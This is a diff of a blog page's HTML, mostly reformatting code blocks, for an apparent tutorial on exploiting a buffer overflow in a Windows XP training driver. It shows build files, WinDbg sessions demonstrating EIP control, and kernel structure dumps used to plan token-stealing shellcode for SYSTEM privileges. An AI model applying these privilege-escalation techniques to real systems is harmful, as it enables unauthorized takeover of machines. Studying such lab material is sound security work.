@@ -31,6 +31,7 @@
 		    <div class="navbar-collapse collapse" id="navbar-main">
 		      <ul class="nav navbar-nav navbar-right">
                 <li class="active"><a href="/">Home</a></li>
+                <li><a href="https://github.com/DimitriFourny">GitHub</a></li>
 		        <li><a href="https://twitter.com/DimitriFourny">Twitter</a></li>
 		        <li><a href="http://fr.linkedin.com/pub/dimitri-fourny/58/283/13a/">Linkedin</a></li>
 		        <li><a href="/feed.xml">RSS</a></li>
@@ -146,32 +147,32 @@ This time, we will use a buffer overflow to make an escalade privilege to get th
 <p>To test the driver, we will need the <a href="http://msdn.microsoft.com/en-us/windows/hardware/hh852365.aspx">Windows Driver Kit and WinDbg</a> and a assembly code compiler, <a href="http://flatassembler.net/download.php">FASM</a>.<br />
 To compile with the WDK, we need to make a file with the name “makefile”:</p>
 
-<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">!</span><span class="n">INCLUDE</span> <span class="err">$</span><span class="p">(</span><span class="n">NTMAKEENV</span><span class="p">)</span><span class="err">\</span><span class="n">makefile</span><span class="p">.</span><span class="n">def</span></code></pre></figure>
+<figure class="highlight"><pre><code class="language-unknown" data-lang="unknown">!INCLUDE $(NTMAKEENV)\makefile.def</code></pre></figure>
 
 <p>Fo a driver, the file “sources”:</p>
 
-<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="n">TARGETNAME</span> <span class="o">=</span> <span class="n">level1</span>
-<span class="n">TARGETPATH</span> <span class="o">=</span> <span class="n">obj</span>
-<span class="n">TARGETTYPE</span> <span class="o">=</span> <span class="n">DRIVER</span>
+<figure class="highlight"><pre><code class="language-unknown" data-lang="unknown">TARGETNAME = level1
+TARGETPATH = obj
+TARGETTYPE = DRIVER
 
-<span class="n">INCLUDES</span> <span class="o">=</span> <span class="err">%</span><span class="n">BUILD</span><span class="err">%\</span><span class="k">inc</span>
-<span class="n">LIBS</span> <span class="o">=</span> <span class="err">%</span><span class="n">BUILD</span><span class="err">%\</span><span class="n">lib</span>
+INCLUDES = %BUILD%\inc
+LIBS = %BUILD%\lib
 
-<span class="n">SOURCES</span> <span class="o">=</span> <span class="n">level1</span><span class="p">.</span><span class="n">c</span></code></pre></figure>
+SOURCES = level1.c</code></pre></figure>
 
 <p>And the “sources” file for a simple .exe:</p>
 
-<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="n">TARGETNAME</span><span class="o">=</span><span class="n">exploit</span>
-<span class="n">TARGETTYPE</span><span class="o">=</span><span class="n">PROGRAM</span>
+<figure class="highlight"><pre><code class="language-unknown" data-lang="unknown">TARGETNAME=exploit
+TARGETTYPE=PROGRAM
 
-<span class="n">INCLUDES</span><span class="o">=</span>
+INCLUDES=
 
-<span class="n">SOURCES</span><span class="o">=</span><span class="n">exploit</span><span class="p">.</span><span class="n">c</span>
+SOURCES=exploit.c
 
-<span class="n">UMTYPE</span><span class="o">=</span><span class="n">console</span>
-<span class="n">UMBASE</span><span class="o">=</span><span class="mh">0x04000000</span>
+UMTYPE=console
+UMBASE=0x04000000
 
-<span class="n">USE_MSVCRT</span><span class="o">=</span><span class="mi">1</span></code></pre></figure>
+USE_MSVCRT=1</code></pre></figure>
 
 <h2 id="debug-a-vm">Debug a VM</h2>
 
@@ -214,79 +215,79 @@ In WinDbg, <strong>File -&gt; Kernel Debug… -&gt; COM</strong> and click on <s
     <span class="k">return</span> <span class="n">EXIT_SUCCESS</span><span class="p">;</span>
 <span class="p">}</span></code></pre></figure>
 
-<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="n">Launching</span> <span class="n">OACR</span> <span class="k">monitor</span>
+<figure class="highlight"><pre><code class="language-unknown" data-lang="unknown">Launching OACR monitor
 
-<span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">WinDDK</span><span class="err">\</span><span class="mi">7600</span><span class="p">.</span><span class="mi">16385</span><span class="p">.</span><span class="mi">1</span><span class="o">&gt;</span><span class="n">cd</span> <span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">driver</span><span class="err">\</span><span class="n">level0</span>
+C:\WinDDK\7600.16385.1&gt;cd C:\driver\level0
 
-<span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">driver</span><span class="err">\</span><span class="n">level0</span><span class="o">&gt;</span><span class="n">build</span>
-<span class="n">BUILD</span><span class="o">:</span> <span class="n">Compile</span> <span class="k">and</span> <span class="n">Link</span> <span class="n">for</span> <span class="n">x86</span>
-<span class="n">BUILD</span><span class="o">:</span> <span class="n">Loading</span> <span class="n">c</span><span class="o">:</span><span class="err">\</span><span class="n">winddk</span><span class="err">\</span><span class="mi">7600</span><span class="p">.</span><span class="mi">16385</span><span class="p">.</span><span class="mi">1</span><span class="err">\</span><span class="n">build</span><span class="p">.</span><span class="n">dat</span><span class="p">...</span>
-<span class="n">BUILD</span><span class="o">:</span> <span class="n">Computing</span> <span class="n">Include</span> <span class="n">file</span> <span class="n">dependencies</span><span class="o">:</span>
-<span class="n">BUILD</span><span class="o">:</span> <span class="n">Start</span> <span class="n">time</span><span class="o">:</span> <span class="n">Thu</span> <span class="n">Feb</span> <span class="mi">27</span> <span class="mi">09</span><span class="o">:</span><span class="mi">13</span><span class="o">:</span><span class="mi">48</span> <span class="mi">2014</span>
-<span class="n">BUILD</span><span class="o">:</span> <span class="n">Examining</span> <span class="n">c</span><span class="o">:</span><span class="err">\</span><span class="n">driver</span><span class="err">\</span><span class="n">level0</span> <span class="n">directory</span> <span class="n">for</span> <span class="n">files</span> <span class="n">to</span> <span class="n">compile</span><span class="p">.</span>
-    <span class="n">c</span><span class="o">:</span><span class="err">\</span><span class="n">driver</span><span class="err">\</span><span class="n">level0</span> <span class="n">Invalidating</span> <span class="n">OACR</span> <span class="n">warning</span> <span class="n">log</span> <span class="n">for</span> <span class="err">'</span><span class="n">root</span><span class="o">:</span><span class="n">x86chk</span><span class="err">'</span>
-<span class="n">BUILD</span><span class="o">:</span> <span class="n">Saving</span> <span class="n">c</span><span class="o">:</span><span class="err">\</span><span class="n">winddk</span><span class="err">\</span><span class="mi">7600</span><span class="p">.</span><span class="mi">16385</span><span class="p">.</span><span class="mi">1</span><span class="err">\</span><span class="n">build</span><span class="p">.</span><span class="n">dat</span><span class="p">...</span>
-<span class="n">BUILD</span><span class="o">:</span> <span class="n">Compiling</span> <span class="k">and</span> <span class="n">Linking</span> <span class="n">c</span><span class="o">:</span><span class="err">\</span><span class="n">driver</span><span class="err">\</span><span class="n">level0</span> <span class="n">directory</span>
-<span class="n">Configuring</span> <span class="n">OACR</span> <span class="n">for</span> <span class="err">'</span><span class="n">root</span><span class="o">:</span><span class="n">x86chk</span><span class="err">'</span> <span class="o">-</span> <span class="o">&lt;</span><span class="n">OACR</span> <span class="n">on</span><span class="o">&gt;</span>
-<span class="n">_NT_TARGET_VERSION</span> <span class="n">SET</span> <span class="n">TO</span> <span class="n">WINXP</span>
-<span class="n">Compiling</span> <span class="o">-</span> <span class="n">exploit</span><span class="p">.</span><span class="n">c</span>
-<span class="n">Linking</span> <span class="n">Executable</span> <span class="o">-</span> <span class="n">objchk_wxp_x86</span><span class="err">\</span><span class="n">i386</span><span class="err">\</span><span class="n">exploit</span><span class="p">.</span><span class="n">exe</span>
-<span class="n">BUILD</span><span class="o">:</span> <span class="n">Finish</span> <span class="n">time</span><span class="o">:</span> <span class="n">Thu</span> <span class="n">Feb</span> <span class="mi">27</span> <span class="mi">09</span><span class="o">:</span><span class="mi">13</span><span class="o">:</span><span class="mi">58</span> <span class="mi">2014</span>
-<span class="n">BUILD</span><span class="o">:</span> <span class="n">Done</span>
+C:\driver\level0&gt;build
+BUILD: Compile and Link for x86
+BUILD: Loading c:\winddk\7600.16385.1\build.dat...
+BUILD: Computing Include file dependencies:
+BUILD: Start time: Thu Feb 27 09:13:48 2014
+BUILD: Examining c:\driver\level0 directory for files to compile.
+    c:\driver\level0 Invalidating OACR warning log for 'root:x86chk'
+BUILD: Saving c:\winddk\7600.16385.1\build.dat...
+BUILD: Compiling and Linking c:\driver\level0 directory
+Configuring OACR for 'root:x86chk' - &lt;OACR on&gt;
+_NT_TARGET_VERSION SET TO WINXP
+Compiling - exploit.c
+Linking Executable - objchk_wxp_x86\i386\exploit.exe
+BUILD: Finish time: Thu Feb 27 09:13:58 2014
+BUILD: Done
 
-    <span class="mi">3</span> <span class="n">files</span> <span class="n">compiled</span> <span class="o">-</span> <span class="mi">1</span> <span class="n">Warning</span> <span class="o">-</span> <span class="mi">30</span> <span class="n">LPS</span>
-    <span class="mi">1</span> <span class="n">executable</span> <span class="n">built</span></code></pre></figure>
+    3 files compiled - 1 Warning - 30 LPS
+    1 executable built</code></pre></figure>
 
-<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="n">kd</span><span class="o">&gt;</span> <span class="n">g</span>
-<span class="err">[</span> <span class="n">Loading</span><span class="p">..</span> <span class="err">]</span>
-<span class="err">[</span> <span class="n">Creating</span> <span class="n">the</span> <span class="n">device</span><span class="p">...</span><span class="err">]</span>
-<span class="err">[</span> <span class="n">Linking</span><span class="p">...</span><span class="err">]</span>
+<figure class="highlight"><pre><code class="language-unknown" data-lang="unknown">kd&gt; g
+[ Loading.. ]
+[ Creating the device...]
+[ Linking...]
 
-<span class="n">kd</span><span class="o">&gt;</span> <span class="n">lm</span>
-<span class="n">start</span>    <span class="n">end</span>        <span class="n">module</span> <span class="n">name</span>
-<span class="mi">804</span><span class="n">d7000</span> <span class="mi">806</span><span class="n">cfe00</span>   <span class="n">nt</span>         <span class="p">(</span><span class="n">pdb</span> <span class="n">symbols</span><span class="p">)</span>          <span class="n">c</span><span class="o">:</span><span class="err">\</span><span class="n">windows</span><span class="err">\</span><span class="n">symbols</span><span class="err">\</span><span class="n">xp</span><span class="err">\</span><span class="n">exe</span><span class="err">\</span><span class="n">ntkrnlpa</span><span class="p">.</span><span class="n">pdb</span>
-<span class="n">baf7d000</span> <span class="n">baf7da80</span>   <span class="mi">1</span>          <span class="p">(</span><span class="n">deferred</span><span class="p">)</span>             
+kd&gt; lm
+start    end        module name
+804d7000 806cfe00   nt         (pdb symbols)          c:\windows\symbols\xp\exe\ntkrnlpa.pdb
+baf7d000 baf7da80   1          (deferred)             
 
-<span class="n">kd</span><span class="o">&gt;</span> <span class="o">?</span> <span class="err">$</span><span class="n">iment</span><span class="p">(</span><span class="mh">0xbaf7d000</span><span class="p">)</span>
-<span class="n">Evaluate</span> <span class="n">expression</span><span class="o">:</span> <span class="o">-</span><span class="mi">1158163440</span> <span class="o">=</span> <span class="n">baf7d410</span>
+kd&gt; ? $iment(0xbaf7d000)
+Evaluate expression: -1158163440 = baf7d410
 
-<span class="n">kd</span><span class="o">&gt;</span> <span class="n">uf</span> <span class="n">baf7d410</span>
-<span class="p">...</span>
-<span class="mi">1</span><span class="o">+</span><span class="mh">0x4f7</span><span class="o">:</span>
-<span class="n">baf7d4f7</span> <span class="mi">8</span><span class="n">b4508</span>          <span class="k">mov</span>     <span class="n">eax</span><span class="p">,</span><span class="n">dword</span> <span class="n">ptr</span> <span class="err">[</span><span class="n">ebp</span><span class="o">+</span><span class="mi">8</span><span class="err">]</span>
-<span class="n">baf7d4fa</span> <span class="n">c7407020d5f7ba</span>  <span class="k">mov</span>     <span class="n">dword</span> <span class="n">ptr</span> <span class="err">[</span><span class="n">eax</span><span class="o">+</span><span class="mi">70</span><span class="n">h</span><span class="err">]</span><span class="p">,</span><span class="n">offset</span> <span class="mi">1</span><span class="o">+</span><span class="mh">0x520</span> <span class="p">(</span><span class="n">baf7d520</span><span class="p">)</span>
-<span class="n">baf7d501</span> <span class="mi">33</span><span class="n">c0</span>            <span class="k">xor</span>     <span class="n">eax</span><span class="p">,</span><span class="n">eax</span>
-<span class="n">baf7d503</span> <span class="mi">8</span><span class="n">be5</span>            <span class="k">mov</span>     <span class="n">esp</span><span class="p">,</span><span class="n">ebp</span>
-<span class="n">baf7d505</span> <span class="mi">5</span><span class="n">d</span>              <span class="k">pop</span>     <span class="n">ebp</span>
-<span class="n">baf7d506</span> <span class="n">c20800</span>          <span class="k">ret</span>     <span class="mi">8</span>
+kd&gt; uf baf7d410
+...
+1+0x4f7:
+baf7d4f7 8b4508          mov     eax,dword ptr [ebp+8]
+baf7d4fa c7407020d5f7ba  mov     dword ptr [eax+70h],offset 1+0x520 (baf7d520)
+baf7d501 33c0            xor     eax,eax
+baf7d503 8be5            mov     esp,ebp
+baf7d505 5d              pop     ebp
+baf7d506 c20800          ret     8
 
-<span class="n">kd</span><span class="o">&gt;</span> <span class="n">uf</span> <span class="n">baf7d520</span>
-<span class="p">...</span>
-<span class="mi">1</span><span class="o">+</span><span class="mh">0x61b</span><span class="o">:</span>
-<span class="n">baf7d61b</span> <span class="mi">32</span><span class="n">d2</span>            <span class="k">xor</span>     <span class="n">dl</span><span class="p">,</span><span class="n">dl</span>
-<span class="n">baf7d61d</span> <span class="mi">8</span><span class="n">b4d0c</span>          <span class="k">mov</span>     <span class="n">ecx</span><span class="p">,</span><span class="n">dword</span> <span class="n">ptr</span> <span class="err">[</span><span class="n">ebp</span><span class="o">+</span><span class="mi">0</span><span class="n">Ch</span><span class="err">]</span>
-<span class="n">baf7d620</span> <span class="n">ff150cd8f7ba</span>    <span class="k">call</span>    <span class="n">dword</span> <span class="n">ptr</span> <span class="err">[</span><span class="mi">1</span><span class="o">+</span><span class="mh">0x80c</span> <span class="p">(</span><span class="n">baf7d80c</span><span class="p">)</span><span class="err">]</span>
-<span class="n">baf7d626</span> <span class="mi">8</span><span class="n">b450c</span>          <span class="k">mov</span>     <span class="n">eax</span><span class="p">,</span><span class="n">dword</span> <span class="n">ptr</span> <span class="err">[</span><span class="n">ebp</span><span class="o">+</span><span class="mi">0</span><span class="n">Ch</span><span class="err">]</span>
-<span class="n">baf7d629</span> <span class="mi">8</span><span class="n">b4018</span>          <span class="k">mov</span>     <span class="n">eax</span><span class="p">,</span><span class="n">dword</span> <span class="n">ptr</span> <span class="err">[</span><span class="n">eax</span><span class="o">+</span><span class="mi">18</span><span class="n">h</span><span class="err">]</span>
-<span class="n">baf7d62c</span> <span class="mi">8</span><span class="n">be5</span>            <span class="k">mov</span>     <span class="n">esp</span><span class="p">,</span><span class="n">ebp</span>
-<span class="n">baf7d62e</span> <span class="mi">5</span><span class="n">d</span>              <span class="k">pop</span>     <span class="n">ebp</span>
-<span class="n">baf7d62f</span> <span class="n">c20800</span>          <span class="k">ret</span>     <span class="mi">8</span>
+kd&gt; uf baf7d520
+...
+1+0x61b:
+baf7d61b 32d2            xor     dl,dl
+baf7d61d 8b4d0c          mov     ecx,dword ptr [ebp+0Ch]
+baf7d620 ff150cd8f7ba    call    dword ptr [1+0x80c (baf7d80c)]
+baf7d626 8b450c          mov     eax,dword ptr [ebp+0Ch]
+baf7d629 8b4018          mov     eax,dword ptr [eax+18h]
+baf7d62c 8be5            mov     esp,ebp
+baf7d62e 5d              pop     ebp
+baf7d62f c20800          ret     8
 
-<span class="n">kd</span><span class="o">&gt;</span> <span class="n">bp</span> <span class="n">baf7d62f</span></code></pre></figure>
+kd&gt; bp baf7d62f</code></pre></figure>
 
 <p>All is ready ! We <code>!go</code> and WinDbg look like that:</p>
 
-<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="n">kd</span><span class="o">&gt;</span> <span class="n">g</span>
-<span class="err">[</span> <span class="n">Let</span><span class="err">'</span><span class="n">s</span> <span class="n">copying</span> <span class="n">this</span> <span class="n">buffer</span><span class="p">...</span><span class="err">]</span><span class="n">Breakpoint</span> <span class="mi">0</span> <span class="n">hit</span>
-<span class="mi">1</span><span class="o">+</span><span class="mh">0x62f</span><span class="o">:</span>
-<span class="n">baf7d62f</span> <span class="n">c20800</span>          <span class="k">ret</span>     <span class="mi">8</span>
+<figure class="highlight"><pre><code class="language-unknown" data-lang="unknown">kd&gt; g
+[ Let's copying this buffer...]Breakpoint 0 hit
+1+0x62f:
+baf7d62f c20800          ret     8
 
-<span class="n">kd</span><span class="o">&gt;</span> <span class="kt">dd</span> <span class="n">esp</span>
-<span class="n">b9019c38</span>  <span class="mi">42424242</span> <span class="mi">8657</span><span class="n">fc00</span> <span class="mi">863</span><span class="n">b0700</span> <span class="mi">806</span><span class="n">d1070</span>
-<span class="n">b9019c48</span>  <span class="mi">80574</span><span class="n">d5e</span> <span class="mi">863</span><span class="n">b0770</span> <span class="mi">8672</span><span class="n">a420</span> <span class="mi">863</span><span class="n">b0700</span>
+kd&gt; dd esp
+b9019c38  42424242 8657fc00 863b0700 806d1070
+b9019c48  80574d5e 863b0770 8672a420 863b0700
 
-<span class="n">kd</span><span class="o">&gt;</span> <span class="n">t</span>
-<span class="mi">42424242</span> <span class="o">??</span>              <span class="o">???</span></code></pre></figure>
+kd&gt; t
+42424242 ??              ???</code></pre></figure>
 
 <p>We control EIP ! Therefore, we will put a shellcode in userland to make an escalade privilege of our process.<br />
 After that, we will point EIP to our shellcode and hop, our process have the SYSTEM rights!</p>
@@ -296,332 +297,332 @@ After that, we will point EIP to our shellcode and hop, our process have the SYS
 <p>How we can do to code this shellcode? We just need to swap the SYSTEM token with our process token and is done!
 Good, we look for structures in our Windows friend:</p>
 
-<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="n">kd</span><span class="o">&gt;</span> <span class="n">r</span> <span class="n">fs</span>
-<span class="n">fs</span><span class="o">=</span><span class="mi">00000030</span>
+<figure class="highlight"><pre><code class="language-unknown" data-lang="unknown">kd&gt; r fs
+fs=00000030
 
-<span class="n">kd</span><span class="o">&gt;</span> <span class="n">dg</span> <span class="n">fs</span>
-                                  <span class="n">P</span> <span class="n">Si</span> <span class="n">Gr</span> <span class="n">Pr</span> <span class="n">Lo</span>
-<span class="n">Sel</span>    <span class="n">Base</span>     <span class="n">Limit</span>     <span class="n">Type</span>    <span class="n">l</span> <span class="n">ze</span> <span class="n">an</span> <span class="n">es</span> <span class="n">ng</span> <span class="n">Flags</span>
-<span class="o">----</span> <span class="o">--------</span> <span class="o">--------</span> <span class="o">----------</span> <span class="o">-</span> <span class="o">--</span> <span class="o">--</span> <span class="o">--</span> <span class="o">--</span> <span class="o">--------</span>
-<span class="mi">0030</span> <span class="n">ffdff000</span> <span class="mi">00001</span><span class="n">fff</span> <span class="n">Data</span> <span class="n">RW</span> <span class="n">Ac</span> <span class="mi">0</span> <span class="n">Bg</span> <span class="n">Pg</span> <span class="n">P</span>  <span class="n">Nl</span> <span class="mi">00000</span><span class="n">c93</span>
+kd&gt; dg fs
+                                  P Si Gr Pr Lo
+Sel    Base     Limit     Type    l ze an es ng Flags
+---- -------- -------- ---------- - -- -- -- -- --------
+0030 ffdff000 00001fff Data RW Ac 0 Bg Pg P  Nl 00000c93
 
-<span class="n">kd</span><span class="o">&gt;</span> <span class="kt">dt</span> <span class="n">_KPCR</span> <span class="n">ffdff000</span>
-<span class="n">nt</span><span class="err">!</span><span class="n">_KPCR</span>
-   <span class="o">+</span><span class="mh">0x000</span> <span class="n">NtTib</span>            <span class="o">:</span> <span class="n">_NT_TIB</span>
-   <span class="o">+</span><span class="mh">0x01c</span> <span class="n">SelfPcr</span>          <span class="o">:</span> <span class="mh">0xffdff000</span> <span class="n">_KPCR</span>
-   <span class="o">+</span><span class="mh">0x020</span> <span class="n">Prcb</span>             <span class="o">:</span> <span class="mh">0xffdff120</span> <span class="n">_KPRCB</span>
-   <span class="o">+</span><span class="mh">0x024</span> <span class="n">Irql</span>             <span class="o">:</span> <span class="mh">0x1c</span> <span class="err">''</span>
-   <span class="o">+</span><span class="mh">0x028</span> <span class="n">IRR</span>              <span class="o">:</span> <span class="mi">4</span>
-   <span class="o">+</span><span class="mh">0x02c</span> <span class="n">IrrActive</span>        <span class="o">:</span> <span class="mi">0</span>
-   <span class="o">+</span><span class="mh">0x030</span> <span class="n">IDR</span>              <span class="o">:</span> <span class="mh">0xffff20d8</span>
-   <span class="o">+</span><span class="mh">0x034</span> <span class="n">KdVersionBlock</span>   <span class="o">:</span> <span class="mh">0x80545ab8</span> <span class="n">Void</span>
-   <span class="o">+</span><span class="mh">0x038</span> <span class="n">IDT</span>              <span class="o">:</span> <span class="mh">0x8003f400</span> <span class="n">_KIDTENTRY</span>
-   <span class="o">+</span><span class="mh">0x03c</span> <span class="n">GDT</span>              <span class="o">:</span> <span class="mh">0x8003f000</span> <span class="n">_KGDTENTRY</span>
-   <span class="o">+</span><span class="mh">0x040</span> <span class="n">TSS</span>              <span class="o">:</span> <span class="mh">0x80042000</span> <span class="n">_KTSS</span>
-   <span class="o">+</span><span class="mh">0x044</span> <span class="n">MajorVersion</span>     <span class="o">:</span> <span class="mi">1</span>
-   <span class="o">+</span><span class="mh">0x046</span> <span class="n">MinorVersion</span>     <span class="o">:</span> <span class="mi">1</span>
-   <span class="o">+</span><span class="mh">0x048</span> <span class="n">SetMember</span>        <span class="o">:</span> <span class="mi">1</span>
-   <span class="o">+</span><span class="mh">0x04c</span> <span class="n">StallScaleFactor</span> <span class="o">:</span> <span class="mh">0x64</span>
-   <span class="o">+</span><span class="mh">0x050</span> <span class="n">DebugActive</span>      <span class="o">:</span> <span class="mi">0</span> <span class="err">''</span>
-   <span class="o">+</span><span class="mh">0x051</span> <span class="n">Number</span>           <span class="o">:</span> <span class="mi">0</span> <span class="err">''</span>
-   <span class="o">+</span><span class="mh">0x052</span> <span class="n">Spare0</span>           <span class="o">:</span> <span class="mi">0</span> <span class="err">''</span>
-   <span class="o">+</span><span class="mh">0x053</span> <span class="n">SecondLevelCacheAssociativity</span> <span class="o">:</span> <span class="mi">0</span> <span class="err">''</span>
-   <span class="o">+</span><span class="mh">0x054</span> <span class="n">VdmAlert</span>         <span class="o">:</span> <span class="mi">0</span>
-   <span class="o">+</span><span class="mh">0x058</span> <span class="n">KernelReserved</span>   <span class="o">:</span> <span class="p">[14]</span> <span class="mi">0</span>
-   <span class="o">+</span><span class="mh">0x090</span> <span class="n">SecondLevelCacheSize</span> <span class="o">:</span> <span class="mi">0</span>
-   <span class="o">+</span><span class="mh">0x094</span> <span class="n">HalReserved</span>      <span class="o">:</span> <span class="p">[16]</span> <span class="mi">0</span>
-   <span class="o">+</span><span class="mh">0x0d4</span> <span class="n">InterruptMode</span>    <span class="o">:</span> <span class="mi">0</span>
-   <span class="o">+</span><span class="mh">0x0d8</span> <span class="n">Spare1</span>           <span class="o">:</span> <span class="mi">0</span> <span class="err">''</span>
-   <span class="o">+</span><span class="mh">0x0dc</span> <span class="n">KernelReserved2</span>  <span class="o">:</span> <span class="p">[17]</span> <span class="mi">0</span>
-   <span class="o">+</span><span class="mh">0x120</span> <span class="n">PrcbData</span>         <span class="o">:</span> <span class="n">_KPRCB</span>
+kd&gt; dt _KPCR ffdff000
+nt!_KPCR
+   +0x000 NtTib            : _NT_TIB
+   +0x01c SelfPcr          : 0xffdff000 _KPCR
+   +0x020 Prcb             : 0xffdff120 _KPRCB
+   +0x024 Irql             : 0x1c ''
+   +0x028 IRR              : 4
+   +0x02c IrrActive        : 0
+   +0x030 IDR              : 0xffff20d8
+   +0x034 KdVersionBlock   : 0x80545ab8 Void
+   +0x038 IDT              : 0x8003f400 _KIDTENTRY
+   +0x03c GDT              : 0x8003f000 _KGDTENTRY
+   +0x040 TSS              : 0x80042000 _KTSS
+   +0x044 MajorVersion     : 1
+   +0x046 MinorVersion     : 1
+   +0x048 SetMember        : 1
+   +0x04c StallScaleFactor : 0x64
+   +0x050 DebugActive      : 0 ''
+   +0x051 Number           : 0 ''
+   +0x052 Spare0           : 0 ''
+   +0x053 SecondLevelCacheAssociativity : 0 ''
+   +0x054 VdmAlert         : 0
+   +0x058 KernelReserved   : [14] 0
+   +0x090 SecondLevelCacheSize : 0
+   +0x094 HalReserved      : [16] 0
+   +0x0d4 InterruptMode    : 0
+   +0x0d8 Spare1           : 0 ''
+   +0x0dc KernelReserved2  : [17] 0
+   +0x120 PrcbData         : _KPRCB
 
-<span class="n">kd</span><span class="o">&gt;</span> <span class="kt">dt</span> <span class="n">_KPRCB</span> <span class="n">ffdff000</span><span class="o">+</span><span class="mh">0x120</span> 
-<span class="n">nt</span><span class="err">!</span><span class="n">_KPRCB</span>
-   <span class="o">+</span><span class="mh">0x000</span> <span class="n">MinorVersion</span>     <span class="o">:</span> <span class="mi">1</span>
-   <span class="o">+</span><span class="mh">0x002</span> <span class="n">MajorVersion</span>     <span class="o">:</span> <span class="mi">1</span>
-   <span class="o">+</span><span class="mh">0x004</span> <span class="n">CurrentThread</span>    <span class="o">:</span> <span class="mh">0x80552740</span> <span class="n">_KTHREAD</span>
-   <span class="o">+</span><span class="mh">0x008</span> <span class="n">NextThread</span>       <span class="o">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span> 
-   <span class="o">+</span><span class="mh">0x00c</span> <span class="n">IdleThread</span>       <span class="o">:</span> <span class="mh">0x80552740</span> <span class="n">_KTHREAD</span>
-   <span class="o">+</span><span class="mh">0x010</span> <span class="n">Number</span>           <span class="o">:</span> <span class="mi">0</span> <span class="err">''</span>
-   <span class="o">+</span><span class="mh">0x011</span> <span class="n">Reserved</span>         <span class="o">:</span> <span class="mi">0</span> <span class="err">''</span>
-   <span class="o">+</span><span class="mh">0x012</span> <span class="n">BuildType</span>        <span class="o">:</span> <span class="mi">2</span>
-   <span class="o">+</span><span class="mh">0x014</span> <span class="n">SetMember</span>        <span class="o">:</span> <span class="mi">1</span>
-   <span class="o">+</span><span class="mh">0x018</span> <span class="n">CpuType</span>          <span class="o">:</span> <span class="mi">6</span> <span class="err">''</span>
-   <span class="o">+</span><span class="mh">0x019</span> <span class="n">CpuID</span>            <span class="o">:</span> <span class="mi">1</span> <span class="err">''</span>
-   <span class="o">+</span><span class="mh">0x01a</span> <span class="n">CpuStep</span>          <span class="o">:</span> <span class="mh">0x3a09</span>
-   <span class="o">+</span><span class="mh">0x01c</span> <span class="n">ProcessorState</span>   <span class="o">:</span> <span class="n">_KPROCESSOR_STATE</span>
-   <span class="o">+</span><span class="mh">0x33c</span> <span class="n">KernelReserved</span>   <span class="o">:</span> <span class="p">[16]</span> <span class="mi">0</span>
-   <span class="o">+</span><span class="mh">0x37c</span> <span class="n">HalReserved</span>      <span class="o">:</span> <span class="p">[16]</span> <span class="mi">0</span>
-   <span class="o">+</span><span class="mh">0x3bc</span> <span class="n">PrcbPad0</span>         <span class="o">:</span> <span class="p">[92]</span>  <span class="s">""</span>
-   <span class="o">+</span><span class="mh">0x418</span> <span class="n">LockQueue</span>        <span class="o">:</span> <span class="p">[16]</span> <span class="n">_KSPIN_LOCK_QUEUE</span>
-   <span class="o">+</span><span class="mh">0x498</span> <span class="n">PrcbPad1</span>         <span class="o">:</span> <span class="p">[8]</span>  <span class="s">""</span>
-   <span class="o">+</span><span class="mh">0x4a0</span> <span class="n">NpxThread</span>        <span class="o">:</span> <span class="mh">0x863a22d0</span> <span class="n">_KTHREAD</span>
-   <span class="o">+</span><span class="mh">0x4a4</span> <span class="n">InterruptCount</span>   <span class="o">:</span> <span class="mh">0x352b</span>
-   <span class="o">+</span><span class="mh">0x4a8</span> <span class="n">KernelTime</span>       <span class="o">:</span> <span class="mh">0x1c0d</span>
-   <span class="o">+</span><span class="mh">0x4ac</span> <span class="n">UserTime</span>         <span class="o">:</span> <span class="mh">0xc8</span>
-   <span class="o">+</span><span class="mh">0x4b0</span> <span class="n">DpcTime</span>          <span class="o">:</span> <span class="mh">0x22</span>
-   <span class="o">+</span><span class="mh">0x4b4</span> <span class="n">DebugDpcTime</span>     <span class="o">:</span> <span class="mi">0</span>
-   <span class="o">+</span><span class="mh">0x4b8</span> <span class="n">InterruptTime</span>    <span class="o">:</span> <span class="mh">0x8a</span>
-   <span class="o">+</span><span class="mh">0x4bc</span> <span class="n">AdjustDpcThreshold</span> <span class="o">:</span> <span class="mh">0x14</span>
-   <span class="o">+</span><span class="mh">0x4c0</span> <span class="n">PageColor</span>        <span class="o">:</span> <span class="mi">0</span>
-   <span class="o">+</span><span class="mh">0x4c4</span> <span class="n">SkipTick</span>         <span class="o">:</span> <span class="mi">0</span>
-   <span class="o">+</span><span class="mh">0x4c8</span> <span class="n">MultiThreadSetBusy</span> <span class="o">:</span> <span class="mi">0</span> <span class="err">''</span>
-   <span class="o">+</span><span class="mh">0x4c9</span> <span class="n">Spare2</span>           <span class="o">:</span> <span class="p">[3]</span>  <span class="s">""</span>
-   <span class="o">+</span><span class="mh">0x4cc</span> <span class="n">ParentNode</span>       <span class="o">:</span> <span class="mh">0x80552e00</span> <span class="n">_KNODE</span>
-   <span class="o">+</span><span class="mh">0x4d0</span> <span class="n">MultiThreadProcessorSet</span> <span class="o">:</span> <span class="mi">1</span>
-   <span class="o">+</span><span class="mh">0x4d4</span> <span class="n">MultiThreadSetMaster</span> <span class="o">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span> 
-   <span class="o">+</span><span class="mh">0x4d8</span> <span class="n">ThreadStartCount</span> <span class="o">:</span> <span class="p">[2]</span> <span class="mi">0</span>
-   <span class="o">+</span><span class="mh">0x4e0</span> <span class="n">CcFastReadNoWait</span> <span class="o">:</span> <span class="mi">0</span>
-   <span class="o">+</span><span class="mh">0x4e4</span> <span class="n">CcFastReadWait</span>   <span class="o">:</span> <span class="mi">0</span>
-   <span class="o">+</span><span class="mh">0x4e8</span> <span class="n">CcFastReadNotPossible</span> <span class="o">:</span> <span class="mi">0</span>
-   <span class="o">+</span><span class="mh">0x4ec</span> <span class="n">CcCopyReadNoWait</span> <span class="o">:</span> <span class="mi">0</span>
-   <span class="o">+</span><span class="mh">0x4f0</span> <span class="n">CcCopyReadWait</span>   <span class="o">:</span> <span class="mi">0</span>
